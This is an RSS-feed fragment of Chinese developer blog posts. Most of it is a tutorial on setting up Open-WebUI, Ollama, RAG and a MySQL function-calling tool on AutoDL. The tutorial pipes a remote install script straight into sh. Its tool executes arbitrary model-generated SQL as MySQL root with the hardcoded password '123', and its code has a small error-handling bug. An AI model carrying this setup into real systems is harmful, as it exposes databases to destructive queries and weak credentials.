    <span class="hljs-attr">rendering</span>: {
        <span class="hljs-comment">// 导出图片需要开启</span>
        <span class="hljs-attr">preserveDrawingBuffer</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">zoom</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },        <span class="hljs-comment">// 缩放控件</span>
        <span class="hljs-attr">fullscreen</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },  <span class="hljs-comment">// 全屏控件</span>
        <span class="hljs-attr">geoLocate</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },   <span class="hljs-comment">// 定位控件</span>
        <span class="hljs-attr">exportImage</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> }, <span class="hljs-comment">// 导出图片控件</span>
        <span class="hljs-attr">compass</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },     <span class="hljs-comment">// 指南针</span>
        <span class="hljs-attr">mapInfo</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },     <span class="hljs-comment">// 显示地理坐标</span>
    },
});

<span class="hljs-comment">// 运行时开启比例尺与 logo</span>
engine.<span class="hljs-property">widgets</span>.<span class="hljs-property">scale</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">true</span>;
engine.<span class="hljs-property">widgets</span>.<span class="hljs-property">logo</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">true</span>;
</code></pre>
<blockquote>
<p>小贴士：<code>exportImage</code> 必须搭配 <code>rendering.preserveDrawingBuffer = true</code>，否则截图会是空白。</p>
</blockquote>
<h2 data-id="heading-1">常用控件一览</h2>













































<table><thead><tr><th>控件</th><th>作用</th><th>使用建议</th></tr></thead><tbody><tr><td><code>zoom</code></td><td>显示缩放按钮</td><td>与鼠标滚轮配合，易用性更高</td></tr><tr><td><code>compass</code></td><td>显示方向和倾角</td><td>适合 3D 场景，便于用户恢复默认视角</td></tr><tr><td><code>fullscreen</code></td><td>全屏切换</td><td>适合大屏展示或需要沉浸体验的场景</td></tr><tr><td><code>geoLocate</code></td><td>定位按钮</td><td>搭配获取定位的业务逻辑使用</td></tr><tr><td><code>exportImage</code></td><td>导出当前场景为图片</td><td>需开启 <code>preserveDrawingBuffer</code></td></tr><tr><td><code>mapInfo</code></td><td>显示当前地理坐标</td><td>对需要精确定位的业务很有帮助</td></tr><tr><td><code>drawer</code></td><td>自定义控件容器（如工具面板）</td><td>可以挂自定义按钮或操作</td></tr></tbody></table>
<h2 data-id="heading-2">深入配置：mapInfo、drawer 与 accessors</h2>
<p>除了 <code>enabled</code>，部分控件还提供更细的参数：</p>
<ul>
<li><strong>mapInfo</strong>
<ul>
<li><code>template</code>：字符串由 <code>C</code>（中心点）、<code>R</code>（视野距离）、<code>H</code>（heading）、<code>P</code>（pitch）等占位符组成，默认 <code>CR</code></li>
<li><code>separator</code>：字段之间的分隔符，默认 <code>' | '</code></li>
<li>例如：<code>mapInfo: { enabled: true, template: 'CHP', separator: ', ' }</code></li>
</ul>
</li>
<li><strong>drawer</strong>
<ul>
<li><code>draws</code> 数组描述每个工具项：<code>name</code>、<code>defaultChecked</code>、<code>data</code>、<code>onChange</code></li>
<li><code>onChange(checked, data, engine)</code> 在开关时触发，可用于添加/移除对象</li>
</ul>
</li>
<li><strong>访问器（accessor）</strong>
<ul>
<li>每个控件都有对应的 getter，例如 <code>engine.widgets.zoom</code>、<code>engine.widgets.scale</code></li>
<li>获取到的是控件实例，可以直接读写属性：<code>engine.widgets.mapInfo.template = 'CRH'</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">自定义 Drawer 控件</h2>
<p><code>drawer</code> 类似一个工具抽屉，可以配置多个“工具项”。每个工具项的 <code>onChange</code> 回调会在开关时触发，可用于添加/移除物体等自定义逻辑。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    ...,
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">drawer</span>: {
            <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">draws</span>: [
                {
                    <span class="hljs-attr">name</span>: <span class="hljs-string">'添加绿盒子'</span>,
                    <span class="hljs-attr">data</span>: { <span class="hljs-attr">mesh</span>: <span class="hljs-literal">null</span> },
                    <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">checked, data, engine</span>) =&gt;</span> {
                        <span class="hljs-keyword">if</span> (!data.<span class="hljs-property">mesh</span>) {
                            <span class="hljs-keyword">const</span> position = engine.<span class="hljs-property">map</span>.<span class="hljs-title function_">projectArrayCoordinate</span>([<span class="hljs-number">106.515</span>, <span class="hljs-number">29.639</span>]);
                            <span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
                            <span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({<span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span>});
                            <span class="hljs-keyword">const</span> mesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
                            mesh.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(position[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>], position[<span class="hljs-number">2</span>]);
                            data.<span class="hljs-property">mesh</span> = mesh;
                        }
                        checked ? engine.<span class="hljs-title function_">add</span>(data.<span class="hljs-property">mesh</span>) : engine.<span class="hljs-title function_">remove</span>(data.<span class="hljs-property">mesh</span>);
                    },
                },
            ],
        },
    },
});
</code></pre>
<h2 data-id="heading-4">截图功能：别忘了 preserveDrawingBuffer</h2>
<p><code>exportImage</code> 控件其实是一个“导出当前画面”的按钮，但要正常截图必须开启 <code>rendering.preserveDrawingBuffer = true</code>。在纯引擎场景下只用设置这一项；如果叠加 BMapGL 或 mapbox，还需要在对应地图实例初始化时开启同名参数。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> engine = <span class="hljs-keyword">new</span> mapvthree.<span class="hljs-title class_">Engine</span>(container, {
    <span class="hljs-attr">rendering</span>: {
        <span class="hljs-attr">preserveDrawingBuffer</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-attr">widgets</span>: {
        <span class="hljs-attr">exportImage</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span> },
    },
});
</code></pre>
<h2 data-id="heading-5">使用建议</h2>
<ul>
<li><strong>按需启用</strong>：控件越多越不一定好，按场景需求启用即可</li>
<li><strong>统一风格</strong>：若有自定义 UI，尽量与内置控件保持视觉一致</li>
<li><strong>与业务逻辑配合</strong>：控件只是入口，核心业务逻辑仍需自行实现（如定位、截图结果保存等）</li>
<li><strong>运行时控制</strong>：可以根据场景状态动态开启/关闭控件，例如进入播放模式时隐藏所有按钮</li>
</ul>
<hr/>
<blockquote>
<p>学习笔记就到这里啦！内置控件用起来并不复杂，关键是理解“初始化配置 + 运行时控制”这两种方式，然后按需组合即可。希望这份笔记能帮你快速把控件用好！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[autoDL安装Open-WebUi+Rag本地知识库问答+Function Calling]]></title>    <link>https://juejin.cn/post/7576929700842405897</link>    <guid>https://juejin.cn/post/7576929700842405897</guid>    <pubDate>2025-11-27T06:16:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842405897" data-draft-id="7576978338754379826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="autoDL安装Open-WebUi+Rag本地知识库问答+Function Calling"/> <meta itemprop="keywords" content="后端,算法,人工智能"/> <meta itemprop="datePublished" content="2025-11-27T06:16:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="16_one"/> <meta itemprop="url" content="https://juejin.cn/user/2802034986197256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            autoDL安装Open-WebUi+Rag本地知识库问答+Function Calling
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2802034986197256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    16_one
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:16:06.000Z" title="Thu Nov 27 2025 06:16:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基础环境搭建</h2>
<ol>
<li>open-webui安装</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">pip install open-webui
</code></pre>
<p>2.  ollama在线安装</p>

<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//ollama.com/install.sh | sh</span>
</code></pre>
<p>2.1. 将模型下载地址改到数据盘</p>
<pre><code class="hljs language-bash" lang="bash">vim /etc/profile
<span class="hljs-built_in">export</span> OLLAMA_MODELS=/root/autodl-tmp/models
<span class="hljs-built_in">source</span> /etc/profile
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75603b64bf91446681b7e171960fb74d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=z6qo5N2GUCerQhCaWBhNKOyyVQk%3D" alt="image.png" loading="lazy"/>
2.2. 启动ollama</p>
<pre><code class="hljs language-sql" lang="sql">ollama <span class="hljs-keyword">start</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3db9188f6141416c9b980fb2dd4c8146~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=mQ7yDOL3gkaqMz8MtpnM3tbyvCQ%3D" alt="5b549c7e-dbee-4a05-b64b-43065e14c80e.png" loading="lazy"/>
3. 安装deepseek-r1:14b模型</p>
<pre><code class="hljs">ollama pull deepseek-r1:14b
</code></pre>
<p>4.  Embedding模型下载</p>

<pre><code class="hljs language-arduino" lang="arduino">ollama pull nomic-embed-text
</code></pre>
<p>5.  查看模型下载情况</p>

<pre><code class="hljs">ollama list
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2197e9452cb8410f886a903fb93a2a92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=lUeO4g2m%2BUm8rAVhZy5Rd9%2FCSXc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">Open-WebUi调用</h2>
<blockquote>
<p>首先需要设置离线环境，避免Open-WebUI启动时自动进行模型下载：</p>
<p>export HF_HUB_OFFLINE=1</p>
</blockquote>
<ol>
<li>Open-WebUi启动</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">open-webui serve
</code></pre>
<p>2.  本地8080端口访问</p>
<blockquote>
<p>需要建立链接隧道，autodl参考这里<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.autodl.com%2Fdocs%2Fvisdom%2F" target="_blank" title="https://www.autodl.com/docs/visdom/" ref="nofollow noopener noreferrer">www.autodl.com/docs/visdom…</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76b1a94e26e14597a37071d737108c93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=dOinCM%2FqSnmhAkPWqHVV%2Bcr4IDY%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>Rag本地知识库问答</li>
</ol>
<blockquote>
<p>按照如下步骤操作后，即可上传文档，进行基础本地知识库问答</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cb9dd05b40b475a823eaf1fb833e510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=XksybYfu5ag%2BoLZjDrKeUavcRh8%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>外部工具调用Function Calling</li>
</ol>
<blockquote>
<p>案例：连接本地MySQL数据库进行数据查询</p>
</blockquote>
<p>4.1. 安装mysql</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建mysql数据库</span>
apt install mysql<span class="hljs-operator">-</span>server


<span class="hljs-comment">-- 启动mysql</span>
mysqld <span class="hljs-operator">&amp;</span>
mysql

<span class="hljs-comment">-- 初始化密码</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">'123'</span>;

<span class="hljs-comment">-- 退出</span>
exit；

<span class="hljs-comment">-- 再次进入</span>
mysql <span class="hljs-operator">-</span>u root <span class="hljs-operator">-</span>p

<span class="hljs-comment">-- 创建数据库</span>
<span class="hljs-keyword">CREATE</span> DATABASE school;
USE school;

<span class="hljs-comment">-- 创建表结构</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> students_scores (
id <span class="hljs-type">INT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
course1 <span class="hljs-type">INT</span>,
course2 <span class="hljs-type">INT</span>,
course3 <span class="hljs-type">INT</span>
);

<span class="hljs-comment">-- 插入数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> students_scores (name, course1, course2, course3)
<span class="hljs-keyword">VALUES</span>
(<span class="hljs-string">'学生1'</span>, <span class="hljs-number">85</span>, <span class="hljs-number">92</span>, <span class="hljs-number">78</span>),
(<span class="hljs-string">'学生2'</span>, <span class="hljs-number">76</span>, <span class="hljs-number">88</span>, <span class="hljs-number">91</span>),
(<span class="hljs-string">'学生3'</span>, <span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">80</span>),
(<span class="hljs-string">'学生4'</span>, <span class="hljs-number">65</span>, <span class="hljs-number">70</span>, <span class="hljs-number">72</span>),
(<span class="hljs-string">'学生5'</span>, <span class="hljs-number">82</span>, <span class="hljs-number">89</span>, <span class="hljs-number">95</span>),
(<span class="hljs-string">'学生6'</span>, <span class="hljs-number">91</span>, <span class="hljs-number">93</span>, <span class="hljs-number">87</span>),
(<span class="hljs-string">'学生7'</span>, <span class="hljs-number">77</span>, <span class="hljs-number">78</span>, <span class="hljs-number">85</span>),
(<span class="hljs-string">'学生8'</span>, <span class="hljs-number">88</span>, <span class="hljs-number">92</span>, <span class="hljs-number">91</span>),
(<span class="hljs-string">'学生9'</span>, <span class="hljs-number">84</span>, <span class="hljs-number">76</span>, <span class="hljs-number">80</span>),
(<span class="hljs-string">'学生10'</span>, <span class="hljs-number">89</span>, <span class="hljs-number">90</span>, <span class="hljs-number">92</span>);

<span class="hljs-comment">-- 需要刷新身份验证，使得其他库（如pymysql）可以通过密码验证登录：</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">'123'</span>;

</code></pre>
<p>4.2. 编写外部工具</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a73a5ccbf0a4261adbfccd56e1bbdb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=DlqmG1q2Sg%2FEf1t3u%2F4va05Ntr8%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Request
<span class="hljs-keyword">from</span> open_webui.models.users <span class="hljs-keyword">import</span> Users


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">sql_inter</span>(<span class="hljs-params">
        self,
        sql_query: <span class="hljs-built_in">str</span>,
        __request__: Request,
        __user__: <span class="hljs-built_in">dict</span>,
        __event_emitter__=<span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""
        用于获取school数据库中各张表的有关相关信息。

        :param sql_query: 字符串形式的SQL查询语句，用于执行对MySQL数据库中的查询
        :param __request__: HTTP 请求对象（来自 FastAPI）
        :param __user__: 用户信息（可以用于个性化或记录请求）
        :param __event_emitter__: 事件发射器，用于将实时状态更新发送到前端
        :return: SQL 查询结果的 JSON 字符串
        """</span>
        <span class="hljs-comment"># Step 1. 通知用户正在执行数据库查询</span>
        <span class="hljs-keyword">await</span> __event_emitter__(
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">"正在查询数据库..."</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">False</span>},
            }
        )

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Step 2. 连接 MySQL 数据库</span>
            connection = pymysql.connect(
                host=<span class="hljs-string">"localhost"</span>,  <span class="hljs-comment"># 数据库地址</span>
                user=<span class="hljs-string">"root"</span>,  <span class="hljs-comment"># 数据库用户名</span>
                passwd=<span class="hljs-string">"123"</span>,  <span class="hljs-comment"># 数据库密码</span>
                db=<span class="hljs-string">"school"</span>,  <span class="hljs-comment"># 数据库名</span>
                charset=<span class="hljs-string">"utf8"</span>,  <span class="hljs-comment"># 字符集选择utf8</span>
            )

            <span class="hljs-comment"># Step 3. 执行 SQL 查询</span>
            <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:
                cursor.execute(sql_query)
                results = cursor.fetchall()

            <span class="hljs-comment"># Step 4. 格式化查询结果</span>
            results_json = json.dumps(results, ensure_ascii=<span class="hljs-literal">False</span>)

            <span class="hljs-comment"># Step 5. 通知用户查询完成</span>
            <span class="hljs-keyword">await</span> __event_emitter__(
                {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">"数据库查询完成"</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">True</span>},
                }
            )

            <span class="hljs-comment"># Step 6. 返回查询结果</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"查询结果: <span class="hljs-subst">{results_json}</span>"</span>

        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-comment"># Step 7. 如果发生错误，通知用户</span>
            <span class="hljs-keyword">await</span> __event_emitter__(
                {
                    <span class="hljs-string">"type"</span>: <span class="hljs-string">"status"</span>,
                    <span class="hljs-string">"data"</span>: {<span class="hljs-string">"description"</span>: <span class="hljs-string">f"发生错误: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>, <span class="hljs-string">"done"</span>: <span class="hljs-literal">True</span>},
                }
            )
            <span class="hljs-comment"># 返回错误信息</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"获取数据库查询数据时发生错误：<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>

        <span class="hljs-keyword">finally</span>:
            <span class="hljs-comment"># Step 8. 关闭数据库连接</span>
            <span class="hljs-keyword">if</span> connection:
                connection.close()

</code></pre>
<p>4.3. 对话中打开数据库查询工具</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f9592cfd91e4aa5bf7118018b1baa58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=KNyyCFN9f60OBErTMbbkmNZgAJo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e44b657d22fa4b00a0057e5632562dda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMTZfb25l:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764828972&amp;x-signature=GLIHvgw5vMyCwZx%2Bc8kLx4gSLLc%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🧱 深入理解栈（Stack）：原理、实现与实战应用]]></title>    <link>https://juejin.cn/post/7577201863750860840</link>    <guid>https://juejin.cn/post/7577201863750860840</guid>    <pubDate>2025-11-27T06:37:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577201863750860840" data-draft-id="7577049352837890063" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 🧱 深入理解栈（Stack）：原理、实现与实战应用"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2025-11-27T06:37:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神秘的猪头"/> <meta itemprop="url" content="https://juejin.cn/user/793223472877051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             🧱 深入理解栈（Stack）：原理、实现与实战应用
